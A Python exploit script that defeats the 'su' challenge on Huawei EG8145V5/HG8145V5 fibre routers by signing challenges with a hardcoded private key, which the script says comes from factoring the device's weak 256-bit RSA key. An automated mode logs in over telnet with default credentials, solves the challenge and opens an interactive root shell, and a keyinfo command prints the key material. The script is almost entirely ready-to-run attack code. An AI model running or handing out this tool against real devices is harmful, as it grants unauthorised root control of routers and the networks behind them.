#!/usr/bin/env python3
"""
Huawei ONT SU Challenge Solver — Answers the WAP CLI 'su' challenge to obtain full shell.

The EG8145V5/HG8145V5 WAP CLI uses a 256-bit RSA challenge-response for the 'su' command.
The 256-bit RSA key is trivially factorable, yielding the private key needed for full shell.

RSA Key Details:
    Modulus (256-bit): cdb6cda2aa36179aa239fc1d48ce9e82194cc577a631897a2df50dfd1f20dad5
    Public exponent: 65537
    p = 297098113301310309198580524816784910303
    q = 313186503727240930873981527043146130379
    Private exponent: b79dc0a4bdeb345c690afab724e2906593e134bc0fec90a5afa79b91c6751d2d

Usage:
    1. Telnet to the router: telnet 192.168.1.1
    2. Login with WAP CLI credentials
    3. Type 'su' and copy the challenge string
    4. Run: python3 hw_su_challenge.py <challenge_hex>
    5. Paste the response back into the telnet session
    6. You now have full shell access (SU_root> prompt)

Alternative (automated):
    python3 hw_su_challenge.py --auto 192.168.1.1 [username] [password]
"""

import argparse
import struct
import sys

# RSA key parameters (factored from the 256-bit public key in /etc/wap/su_pub_key)
RSA_N = 0xcdb6cda2aa36179aa239fc1d48ce9e82194cc577a631897a2df50dfd1f20dad5
RSA_E = 65537
RSA_D = 0xb79dc0a4bdeb345c690afab724e2906593e134bc0fec90a5afa79b91c6751d2d
RSA_P = 297098113301310309198580524816784910303
RSA_Q = 313186503727240930873981527043146130379


def solve_challenge(challenge_hex):
    """Solve the SU challenge by RSA-signing it with the private key.

    Args:
        challenge_hex: The hex-encoded challenge string from the router

    Returns:
        The hex-encoded response to send back
    """
    challenge_hex = challenge_hex.strip().replace(' ', '').replace(':', '')

    # Convert hex challenge to integer
    challenge_int = int(challenge_hex, 16)

    # RSA sign: response = challenge^d mod n
    response_int = pow(challenge_int, RSA_D, RSA_N)

    # Convert back to hex (same byte length as modulus)
    byte_len = (RSA_N.bit_length() + 7) // 8
    response_hex = format(response_int, f'0{byte_len * 2}x')

    return response_hex


def auto_solve(host, username='root', password='admin', port=23):
    """Automatically connect, login, solve SU challenge, and drop to shell.

    Args:
        host: Router IP address
        username: WAP CLI username
        password: WAP CLI password
        port: Telnet port (default 23)
    """
    import telnetlib
    import time
    import re

    print(f"[*] Connecting to {host}:{port}...")
    try:
        tn = telnetlib.Telnet(host, port, timeout=10)
    except Exception as e:
        print(f"[!] Connection failed: {e}")
        sys.exit(1)

    # Wait for login prompt
    print("[*] Waiting for login prompt...")
    output = tn.read_until(b"Login:", timeout=10)
    print(f"    {output.decode(errors='replace').strip()}")

    # Send username
    print(f"[*] Sending username: {username}")
    tn.write(username.encode() + b"\n")
    time.sleep(0.5)

    # Wait for password prompt
    output = tn.read_until(b"Password:", timeout=10)

    # Send password
    print(f"[*] Sending password...")
    tn.write(password.encode() + b"\n")
    time.sleep(1)

    # Check if we got the WAP> prompt
    output = tn.read_until(b">", timeout=10)
    decoded = output.decode(errors='replace')
    print(f"    {decoded.strip()}")

    if "WAP>" not in decoded and ">" not in decoded:
        print("[!] Login failed - did not get CLI prompt")
        tn.close()
        sys.exit(1)

    # Send 'su' command
    print("[*] Sending 'su' command...")
    tn.write(b"su\n")
    time.sleep(1)

    # Read the challenge
    output = tn.read_until(b"\n", timeout=10)
    decoded = output.decode(errors='replace').strip()
    print(f"    Response: {decoded}")

    # Read more until we get the challenge
    time.sleep(0.5)
    more = tn.read_very_eager().decode(errors='replace').strip()
    if more:
        decoded += more
        print(f"    More: {more}")

    # Extract hex challenge (look for hex string)
    hex_match = re.search(r'[0-9a-fA-F]{32,}', decoded)
    if hex_match:
        challenge = hex_match.group()
        print(f"[*] Challenge: {challenge}")

        # Solve it
        response = solve_challenge(challenge)
        print(f"[*] Response:  {response}")

        # Send response
        tn.write(response.encode() + b"\n")
        time.sleep(1)

        output = tn.read_very_eager().decode(errors='replace')
        print(f"    {output.strip()}")

        if "SU_" in output or "SUCC" in output.upper():
            print("[+] SU challenge solved! Full shell access granted.")
            print("[*] Entering interactive mode (Ctrl+] to quit)...")
            tn.interact()
        else:
            print("[!] SU challenge may have failed. Output above.")
            print("[*] Entering interactive mode anyway...")
            tn.interact()
    else:
        print("[!] Could not find challenge hex in response")
        print("[*] The router may not require SU challenge (try typing 'shell' or 'enable')")
        print("[*] Entering interactive mode...")
        tn.interact()

    tn.close()


def main():
    parser = argparse.ArgumentParser(
        description='Huawei ONT SU Challenge Solver — Get full shell from WAP CLI')

    subparsers = parser.add_subparsers(dest='command')

    # Manual mode
    manual = subparsers.add_parser('solve', help='Solve a challenge manually')
    manual.add_argument('challenge', help='Hex-encoded challenge from router')

    # Auto mode
    auto = subparsers.add_parser('auto', help='Auto-connect and solve')
    auto.add_argument('host', help='Router IP (default: 192.168.1.1)',
                      nargs='?', default='192.168.1.1')
    auto.add_argument('--user', '-u', default='root', help='CLI username')
    auto.add_argument('--password', '-p', default='admin', help='CLI password')
    auto.add_argument('--port', type=int, default=23, help='Telnet port')

    # Key info
    subparsers.add_parser('keyinfo', help='Show RSA key details')

    args = parser.parse_args()

    if args.command == 'solve':
        response = solve_challenge(args.challenge)
        print(f"Response: {response}")

    elif args.command == 'auto':
        auto_solve(args.host, args.user, args.password, args.port)

    elif args.command == 'keyinfo':
        print("SU RSA Key Details (EG8145V5 / HG8145V5)")
        print(f"  Modulus (n):          {RSA_N:064x}")
        print(f"  Public exponent (e):  {RSA_E}")
        print(f"  Private exponent (d): {RSA_D:064x}")
        print(f"  Prime p:              {RSA_P}")
        print(f"  Prime q:              {RSA_Q}")
        print(f"  Key size:             {RSA_N.bit_length()} bits (trivially factorable)")
        print(f"\n  Public key file:  /etc/wap/su_pub_key")
        print(f"  Factored via:     factordb.com (instant)")

    else:
        parser.print_help()
        print("\nExamples:")
        print("  python3 hw_su_challenge.py solve <challenge_hex>")
        print("  python3 hw_su_challenge.py auto 192.168.1.1 -u root -p admin")
        print("  python3 hw_su_challenge.py keyinfo")


if __name__ == '__main__':
    main()
